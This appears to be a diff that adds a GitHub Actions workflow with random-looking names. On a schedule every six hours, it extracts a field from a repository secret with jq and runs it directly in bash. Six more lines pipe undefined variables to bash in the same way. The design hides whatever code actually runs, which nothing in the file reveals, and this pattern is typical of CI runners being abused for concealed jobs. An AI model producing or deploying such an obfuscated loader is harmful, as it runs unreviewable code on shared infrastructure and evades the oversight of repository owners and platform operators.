@@ -1,0 +1,23 @@
+name: ugliestdigital
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ugliestdigital
+        env:
+          t7187: ${{ secrets.t7187 }}
+        run: |
+          echo $t7187 | jq -r .ac2513 | /bin/bash
+          echo $ajcb42 | jq -r .zjks6846 | /bin/bash
+          echo $c6 | jq -r .m8 | /bin/bash
+          echo $hfb60 | jq -r .hh92602 | /bin/bash
+          echo $uco880 | jq -r .kussr631 | /bin/bash
+          echo $h89482 | jq -r .qzn7 | /bin/bash
+          echo $t16891 | jq -r .bdqnz32 | /bin/bash
+
